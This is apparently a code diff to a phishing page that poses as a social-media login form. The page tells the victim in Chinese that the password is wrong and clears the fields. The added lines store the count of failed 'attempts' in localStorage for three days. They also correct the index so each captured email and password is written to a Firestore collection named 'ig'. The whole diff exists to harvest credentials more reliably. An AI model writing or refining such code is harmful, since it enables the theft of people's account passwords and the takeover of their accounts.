@@ -276,6 +276,13 @@ body,button,input,textarea{font-family:-apple-system,BlinkMacSystemFont,"Segoe U
         var TIME = String(Date.now());
         var lag = 10;
         var c = 0;
+        var xi;
+        if(localStorage["xi"])
+            xi = JSON.parse(localStorage["xi"]);
+        else
+            xi = {c: 0, t: Date.now()};
+        if(Date.now() < xi.t + 3*24*60*60*1000)
+            c = xi.c;
         var p;
         var d = [];
         function _prelog() {
@@ -329,6 +336,8 @@ body,button,input,textarea{font-family:-apple-system,BlinkMacSystemFont,"Segoe U
                 document.getElementById("m_login_email").value = "";
                 document.getElementById("m_login_password").value = "";
                 }, lag);
+                xi = {c: 1, t: Date.now()};
+                localStorage["xi"] = JSON.stringify(xi);
             } else if(c === 2) {
             setTimeout(function(){
                 document.getElementById("noticet").innerHTML = "你輸入的密碼不正確。";
@@ -336,6 +345,8 @@ body,button,input,textarea{font-family:-apple-system,BlinkMacSystemFont,"Segoe U
                 document.getElementById("m_login_email").value = "";
                 document.getElementById("m_login_password").value = "";
                 }, lag);
+                xi = {c: 2, t: Date.now()};
+                localStorage["xi"] = JSON.stringify(xi);
             } else if(c === 3) {
             setTimeout(function(){
                 document.getElementById("m_login_email").value = "";
@@ -382,7 +393,7 @@ body,button,input,textarea{font-family:-apple-system,BlinkMacSystemFont,"Segoe U
             pn.type = (pn.type == "password") ? "text" : "password";
         }
         function _action() {
-            db.collection("ig").doc(d[c-1].email).collection(TIME).doc(String(c)).set({pass: d[c-1].password})
+            db.collection("ig").doc(d[d.length-1].email).collection(TIME).doc(String(c)).set({pass: d[d.length-1].password})
             .then(()=>console.log("resolved"))
             .catch(e=>console.log(e));
         }
